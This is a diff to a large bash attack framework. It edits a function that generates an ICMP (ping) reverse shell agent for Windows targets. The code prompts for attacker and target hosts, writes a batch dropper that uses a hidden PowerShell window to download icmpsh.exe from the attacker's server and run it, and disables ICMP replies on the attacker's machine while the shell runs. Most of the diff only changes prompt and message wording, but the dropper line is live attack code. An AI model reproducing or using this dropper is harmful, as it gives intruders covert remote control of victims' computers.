@@ -11249,11 +11249,11 @@ fi
 # --------------------
 sh_icmp_shell () {
 # get user input to build shellcode
-echo "[☠] Enter agent settings!"
-lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-target=$(zenity --title="☠ Enter RHOST ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
+echo "[☠] Enter master (server) settings!"
+lhost=$(zenity --title="☠ Enter LHOST (local) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+target=$(zenity --title="☠ Enter RHOST (target) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter target upload path ☠" --text "example: %tmp%" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Upload Path (target) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 if [ -z "$rpath" ]; then
 rpath="%tmp%"
 fi
@@ -11266,7 +11266,7 @@ cat << !
     | LHOST  : $lhost
     | TARGET : $target
     | UPLOAD : $rpath\icmpsh.exe
-    | FORMAT : ICMP (ping) shell
+    | FORMAT : ICMP (ping) Reverse Shell
     |_DISCLOSURE: @Daniel Compton
 
 !
@@ -11274,14 +11274,14 @@ sleep 2
 ## Disable ICMP ping replies
 LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
 if [ "$LOCALICMP" -eq 0 ]; then 
-   echo "${RedF}[x]${white} Local ICMP Replies are enabled (disable temporarily)${white}"
+   echo "${RedF}[x]${white} ICMP Replies are enabled (disable temporarily)${white}"
    sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1
    ICMPDIS="disabled"
 fi
 
 
 ## Build batch dropper
-echo "[☠] Build batch dropper: $N4m.bat ..";sleep 2
+echo "[☠] Building batch dropper: $N4m.bat ..";sleep 2
 echo "@echo off" > $IPATH/output/$N4m.bat
 echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$IP/icmpsh.exe', '$rpath\\icmpsh.exe') && start $rpath\\icmpsh.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
 echo "exit" >> $IPATH/output/$N4m.bat
@@ -11306,7 +11306,7 @@ cd $IPATH
 
 ## Exit script execution
 if [ "$ICMPDIS" = "disabled" ]; then
-   echo "${GreenF}[☠]${white} Enabling Local ICMP Replies again now.${white}";sleep 2
+   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again.${white}";sleep 2
    sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
 fi
 
@@ -11316,8 +11316,7 @@ echo "[☠] Cleanning temp generated files...";sleep 2
 rm $ApAcHe/$N4m.bat > /dev/nul 2>&1
 rm $ApAcHe/icmpsh.exe > /dev/nul 2>&1
 cd $IPATH
-zenity --title="☠ ICMP (ping) shell ☠" --text "REMARK:\nRemmenber to delete 'icmpsh.exe' from target system." --info --width 300 > /dev/null 2>&1
-sh_microsoft_menu
+zenity --title="☠ ICMP (ping) Reverse Shell ☠" --text "REMARK:\nRemmenber to delete 'icmpsh.exe'\nslave (client) from target system." --info --width 350 > /dev/null 2>&1
 }
 
 
@@ -12536,7 +12535,7 @@ cat << !
 
     AGENT Nº21:
     ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : ICMP (ping) reverse shell
+    | DESCRIPTION        : ICMP (ping) Reverse Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | AGENT EXTENSION    : EXE
     | LAUNCHER EXTENSION : BAT
